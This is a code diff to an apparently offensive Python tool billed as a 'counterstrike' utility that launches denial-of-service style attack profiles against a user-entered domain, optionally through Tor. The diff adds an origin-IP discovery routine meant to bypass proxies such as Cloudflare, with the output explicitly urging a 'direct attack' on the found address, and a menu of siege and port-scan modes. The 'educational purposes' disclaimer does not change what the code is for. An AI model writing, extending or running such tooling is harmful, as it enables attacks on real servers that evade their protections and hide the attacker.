@@ -4,6 +4,7 @@ import threading
 import time
 import socket
 import counter_strike_helper
+import recon_helper
 
 
 def launch_attack_thread(target_func, args_tuple):
@@ -106,7 +107,7 @@ def reconnaissance_led_strike(target, use_proxy, network_interface):
     common_ports.extend([3306, 3389, 5432, 8000, 8080, 8443])
 
     # Run the port scan and get the list of open ports
-    discovered_open_ports = counter_strike_helper.run_port_scan(target, common_ports, threads=200)
+    discovered_open_ports = recon_helper.run_port_scan(target, common_ports, threads=200)
 
     if not discovered_open_ports:
         print("[!] No open ports found. Cannot launch a targeted attack. Aborting.")
@@ -328,6 +329,44 @@ def adaptive_strike(target, use_proxy, network_interface):
         time.sleep(2)
 
 
+# --- NEW: ORIGIN DISCOVERY ORCHESTRATOR (Now calls the recon_helper) ---
+def run_origin_discovery(target):
+    """
+    Runs various reconnaissance techniques to find the real IP behind a proxy.
+    """
+    print("\n" + "=" * 60)
+    print("MODE: ORIGIN IP DISCOVERY")
+    print("This will attempt to find the real server IP behind services like Cloudflare.")
+    print("=" * 60)
+
+    try:
+        proxied_ips = set(counter_strike_helper.resolve_to_ipv4(target))
+        if not proxied_ips:
+            print(f"[ERROR] Could not resolve the primary domain: {target}")
+            return
+        print(f"[*] Current proxied IPs for {target}: {proxied_ips}")
+    except Exception as e:
+        print(f"[ERROR] An error occurred during initial resolution: {e}")
+        return
+
+    # Call the functions from the new module
+    mx_ips = recon_helper.find_origin_ip_by_mx(target)
+    subdomain_ips = recon_helper.find_origin_ip_by_subdomains(target)
+
+    all_potential_ips = mx_ips.union(subdomain_ips)
+    origin_candidates = all_potential_ips - proxied_ips
+
+    print("\n--- DISCOVERY COMPLETE ---")
+    if origin_candidates:
+        print("[SUCCESS] Found potential origin IP(s) that are NOT behind the proxy:")
+        for ip in sorted(list(origin_candidates)):
+            print(f"  -> {ip}")
+        print("\nUse one of these IPs as your target for a direct attack.")
+    else:
+        print("[INFO] No non-proxied IP addresses were found with these methods.")
+        print("The server may be well-configured, or you can try a larger subdomain list.")
+
+
 # --- Main Execution Block with Auto-Detection ---
 if __name__ == "__main__":
     print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
@@ -340,6 +379,7 @@ if __name__ == "__main__":
         # The script will continue, but the user is warned.
 
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
+
     target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
 
     proxy_choice = input("Enable SOCKS Proxy (Tor) for L7 attacks (y/n): ").lower()
@@ -353,29 +393,54 @@ if __name__ == "__main__":
             print("[!] Tor enabled. L7 attacks will be slower but anonymized.")
 
     try:
-        options_text = """
-    Select an Attack Profile:
-      1: Full Scale Counterstrike (Max-power siege)
-      2: Fast Counterstrike (Short, intense burst)
-      3: Adaptive Counterstrike (Smart, responsive attack)
-      4. Recon-led Strike (Scan first, then attack)
-      5. Level 2 Penetrator (Focused assault on hardened servers)
+        main_menu_text = """
+        Select an Action:
+          1: Launch Blended Attack Profile
+          2: Run Reconnaissance / Discovery
 
-    Please enter your option: """
-        options = int(input(options_text))
+        Please enter your option: """
+        main_choice = int(input(main_menu_text))
+        if main_choice == 1:
+            options_text = """
+        Select an Attack Profile:
+          1: Full Scale Counterstrike (Max-power siege)
+          2: Fast Counterstrike (Short, intense burst)
+          3: Adaptive Counterstrike (Smart, responsive attack)
+          4. Recon-led Strike (Scan first, then attack)
+          5. Level 2 Penetrator (Focused assault on hardened servers)
+    
+        Please enter your option: """
+            options = int(input(options_text))
 
-        if options == 1:
-            full_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
-        elif options == 2:
-            fast_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
-        elif options == 3:
-            adaptive_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
-        elif options == 4:
-            reconnaissance_led_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
-        elif options == 5:
-            level2_penetrator_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            if options == 1:
+                full_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            elif options == 2:
+                fast_scale_counter_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            elif options == 3:
+                adaptive_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            elif options == 4:
+                reconnaissance_led_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            elif options == 5:
+                level2_penetrator_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            else:
+                print("Invalid option selected. Exiting.")
+        elif main_choice == 2:
+            recon_menu_text = """
+        Select a Reconnaissance Task:
+          1: Port Scan (Find open services)
+          2: Discover Origin IP (Bypass Proxy)
+
+        Please enter your option: """
+            recon_choice = int(input(recon_menu_text))
+            if recon_choice == 1:
+                # The recon-led strike starts with a port scan
+                reconnaissance_led_strike(target_domain, proxy_enabled, NETWORK_INTERFACE)
+            elif recon_choice == 2:
+                run_origin_discovery(target_domain)
+            else:
+                print("Invalid recon option.")
         else:
-            print("Invalid option selected. Exiting.")
+            print("Invalid category selected. Exiting.")
 
     except ValueError:
         print("Invalid input. Please enter a number.")
